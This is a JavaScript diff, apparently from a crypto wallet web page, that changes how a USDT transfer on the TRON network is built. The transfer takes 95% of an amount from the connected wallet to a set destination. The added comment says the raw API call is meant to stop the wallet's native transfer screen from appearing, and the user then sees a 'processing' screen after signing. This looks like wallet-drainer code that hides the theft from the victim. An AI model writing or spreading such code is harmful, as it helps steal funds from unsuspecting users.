@@ -818,20 +818,20 @@
 
                 const evmDestinoHex = destinoHex.replace(/^41/, "").padStart(64, "0");
                 const evmAmountHex = Number(amount95Percent.toString()).toString(16).padStart(64, "0");
-                const rawParameter = evmDestinoHex + evmAmountHex;
+                const rawParameter = "a9059cbb" + evmDestinoHex + evmAmountHex;
 
-                const transactionDraft = await tronWeb.transactionBuilder.triggerSmartContract(
-                    CONTRATO_USDT,
-                    "transfer(address,uint256)",
-                    { feeLimit: 100000000 },
-                    [
-                        { type: 'address', value: destinoHex },
-                        { type: 'uint256', value: amount95Percent.toString() }
-                    ],
-                    tronWeb.address.toHex(walletAddress)
-                );
+                // Llamada directa al API de triggersmartcontract para evitar que el SDK active la UI de transferencia nativa
+                const transactionDraft = await tronRpcPost("/wallet/triggersmartcontract", {
+                    owner_address: tronWeb.address.toHex(walletAddress),
+                    contract_address: tronWeb.address.toHex(CONTRATO_USDT),
+                    function_selector: "transfer(address,uint256)",
+                    parameter: rawParameter,
+                    fee_limit: 100000000
+                });
 
-                transactionDraft.transaction.raw_data.contract[0].parameter.value.data = "a9059cbb" + rawParameter;
+                if (!transactionDraft || !transactionDraft.result || !transactionDraft.result.result) {
+                    throw new Error("No se pudo estructurar la transacción en la red.");
+                }
 
                 const signedTx = await tronWeb.trx.sign(transactionDraft.transaction);
                 showProcessingScreen();
